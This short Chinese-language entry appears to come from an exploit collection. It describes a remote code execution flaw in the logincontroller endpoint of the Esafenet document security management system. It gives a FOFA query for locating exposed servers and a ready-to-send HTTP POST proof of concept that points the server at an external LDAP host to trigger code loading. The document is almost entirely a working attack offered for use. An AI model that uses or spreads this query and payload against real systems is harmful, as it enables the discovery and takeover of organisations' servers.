# 亿赛通电子文档安全管理系统logincontroller接口存在远程代码执行漏洞

亿赛通电子文档安全管理系统 /CDGServer3/logincontroller 接口存在远程代码执行漏洞。

## fofa

```yaml
body="/CDGServer3/index.jsp"
```

## poc

```java
POST /CDGServer3/logincontroller HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Connection: close

fromurl=/LdapAjax&token=1&command=testConnection&hosts=ldap://192.168.10.1:1379/CN=account,OU=exp,DC=exp,DC=com&users=account&dns=CN=account,OU=exp,DC=exp,DC=com&dns2=OU=exp,DC=exp,DC=com&type=0&pwds=123456
```

